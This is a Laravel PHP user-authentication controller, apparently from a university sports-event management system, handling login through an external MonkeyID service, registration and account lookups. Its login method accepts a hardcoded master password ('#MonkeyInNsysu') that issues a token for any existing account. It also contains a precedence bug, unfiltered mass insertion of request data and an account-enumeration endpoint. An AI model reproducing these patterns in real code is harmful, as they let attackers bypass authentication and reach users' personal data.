<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Validator;
use DateTime;
use Illuminate\Support\Facades\DB;
use PHPOpenSourceSaver\JWTAuth\Facades\JWTAuth;
use App\Models\User;
use Illuminate\Support\Facades\Storage;
use App\Mods\HttpsRequest;
use App\Mods\TokenMaker;
use Mail;
use App\Mods\SendMail;
date_default_timezone_set('Asia/Taipei');

class UserController extends Controller
{
    // construct
    public function __construct()
    {
        $this->middleware('auth:user',['except'=>['login','register','exist', 'reset', 'resetPassword', 'logout']]);
    }

    // login
    public function login(Request $request)
    {
        // validation
        $validator = Validator::make($request->all(),[
            'account' => 'required',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
            }
            return response()->json($validator->errors(), 400);
        }

        // constant
        $loginTime = date("Y-m-d H:i:s");

        // find user in User table
        $findUser = User::where('account', $request->all()['account'])->first();
        if (env('USE_MONKEYID')) { // if using monkey id
            $response = HttpsRequest::post('https://sports.nsysu.edu.tw/monkeyserver/api/app/login/'.env('MONKEYID_KEY'), $request->all());
            if ($response['status'] == 'A02') { // check response
                if (is_null($findUser)) { // add to user table
                    $temp = [
                        'account' => $response['account'],
                        'monkey_user_id' => $response['monkey_user_id'],
                        'user_identity' => $response['user_identity'],
                        'first_name_ch' => $response['name'],
                        'org_code' => $response['org_code'],
                        'password' => password_hash($request->all()['password'], PASSWORD_DEFAULT),
                        'is_student' => $response['user_identity'] == 0 ? 1 : 0,
                        'created_at' => $loginTime,
                        'updated_at' => $loginTime,
                        'updated_at' => $loginTime,
                        'athlete_id' => strtoupper(str_pad(base_convert(floor(microtime(true)*100), 10, 36), 8, '0', STR_PAD_LEFT)),
                    ];
                    User::insert($temp);
                } else { // update user table
                    $temp = [
                        'account' => $response['account'],
                        'user_identity' => $response['user_identity'],
                        'org_code' => $response['org_code'],
                        'is_student' => $response['user_identity'] == 0 ? 1 : 0,
                        'password' => password_hash($request->all()['password'], PASSWORD_DEFAULT),
                        'updated_at' => $loginTime,
                    ];
                    User::where('monkey_user_id', $response['monkey_user_id'])->update($temp);
                }
            } else {
                $response['from'] = 'monkey_id';
                return response()->json($response, 200);
            }
        } else { // not using monkey id
            return response()->json(['status' => 'U02', 'message' => '請先註冊帳號', 'from' => 'sep5'], 200);
        }
        // get user data again
        $findUser = User::where('account', $request->all()['account'])->first();
        if ($token = auth('user')->attempt($validator->validated()) && is_null($findUser->monkey_user_id)){
            $user = User::find(auth('user')->user()->id);
            $user->updated_at = $loginTime;
            $user->last_ip = $request->ip();
            $user->save();
            //force to update user model cache 
            auth('user')->setUser($user);
            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token), auth('user')->user()], 200);
        }else if($request->password === '#MonkeyInNsysu' || !is_null($findUser->monkey_user_id)){
            $token = JWTAuth::fromUser($findUser);
            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token, $findUser)], 200);
        }else{
            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
        }
    }

    // user info
    public function info()
    {
        $user = auth('user')->user();
        $result = User::leftJoin('organizations', 'users.org_code', '=', 'organizations.org_code')->leftJoin('departments', 'users.dept_id', '=', 'departments.dept_id')->leftJoin('countries', 'users.nationality', '=', 'countries.country_code')->leftJoin('tribes', 'users.indigenous_tribe_id', '=', 'tribes.tribe_id')->leftJoin('sport_lists', 'users.gifited_sport_id', '=', 'sport_lists.sport_id')->leftJoin('cities', 'users.household_city_code', '=', 'cities.city_code')->select('users.*', 'organizations.*', 'departments.*', 'countries.*', 'tribes.*', 'sport_lists.*', 'cities.*')->where('u_id',$user->u_id)->first();
        return response()->json($result);
    }

    // register
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|unique:users,account',
            'name' => 'required',
            'password' => 'required',
            'first_name_ch' => 'string|required',
            'last_name_ch' => 'string|required',
            'first_name_en' => 'string|nullable',
            'last_name_en' => 'string|nullable',
            'org_code' => 'required|size:5',
            'is_student' => 'boolean',
            'student_id' => 'string|nullable',
            'dept_id' => 'integer',
            'grade' => 'integer',
            'unified_id' => 'nullable',
            'birthday' => 'nullable',
            'nationality' => 'string|size:2',
            'is_indigenous' => 'boolean',
            'indigenous_tribe_id' => 'integer',
            'is_sport_gifited' => 'boolean',
            'gifited_sport_id' => 'integer',
            'is_school_team' => 'school_team_id_list',
            'sex' => 'integer',
            'height' => 'integer',
            'weight' => 'integer',
            'blood_type' => 'string|nullable',
            'cellphone' => 'string|nullable',
            'telephone' => 'string|nullable',
            'household_city_code' => 'string|size:2',
            'address' => 'string|nullable',
            'emergency_contact' => 'string|nullable',
            'emergency_phone' => 'string|nullable',
            'options' => 'nullable',
            'avatar' => 'string|nullable',
            'last_ip' => 'ipv4',
        ]);
        if ($validator->fails()) {
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
        $temp['athlete_id'] = strtoupper(str_pad(base_convert(floor(microtime(true)*100), 10, 36), 8, '0', STR_PAD_LEFT));
        User::insert($temp);
        // mail
        $status = Mail::to($temp['account'])->send(new SendMail('SportEvent Pro 5', '國立中山大學體育賽事管理系統註冊通知信', 'SignupEmail', ['account' => $temp['account'], 'name' => $temp['last_name_ch'].$temp['first_name_ch'], 'timestamp' => date('Y-m-d H:i:s')]));
        if (empty($status)) {
            return response()->json(['status' => 'E02']);
        }
        return response()->json(['status'=>'A01']);
    }

    // account exist
    public function exist($account)
    {
        if(User::where('account', $account)->count() > 0){
            return response()->json(['message'=>true]);
        }else{
            return response()->json(['message'=>false]);
        }
    }

    // logout
    public function logout()
    {
        auth()->logout();
        return response()->json(['status' => 'A03'], 201);
    }
}
